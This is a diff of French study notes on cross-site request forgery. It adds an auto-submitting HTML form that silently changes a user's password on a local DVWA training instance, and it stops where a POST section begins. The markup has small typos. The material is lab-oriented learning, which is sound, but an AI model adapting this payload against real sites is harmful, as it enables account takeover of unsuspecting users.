@@ -1,6 +1,36 @@
 # CSRF - Cross-Site Request Forgery
 
-## Exemple
+## HTTP methode GET
+
+Exemple d'uilisation sur DVWA (Low):
+
+```html
+<!DOCTYPE html>
+html lang="fr">	<head>
+		<meta charset="UTF-8">
+		<meta http-equiv="X-UA-Compatible" content"IE=edge">
+		<title></title>
+		<meta name="description" content="">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+	</head>
+	<body>
+		<header>
+		</header>
+		<main>
+			<form id="my_form" method="GET" action="http://192.168.1.10:81/dvwa/vulnerabilities/csrf/">
+				<input type="text" name="password_new" value="azerty123+" />
+				<input type="text" name="password_conf" value="azerty123+" />
+				<input type="text" name="Change" value="Change" />
+			</form>
+			<script>document.getElementById("my_form").submit();</script>
+		</main>
+		<footer>
+		</footer>
+	</body>
+</html>
+```
+
+## HTTP methode = POST
 
 ```html
 <!DOCTYPE html>
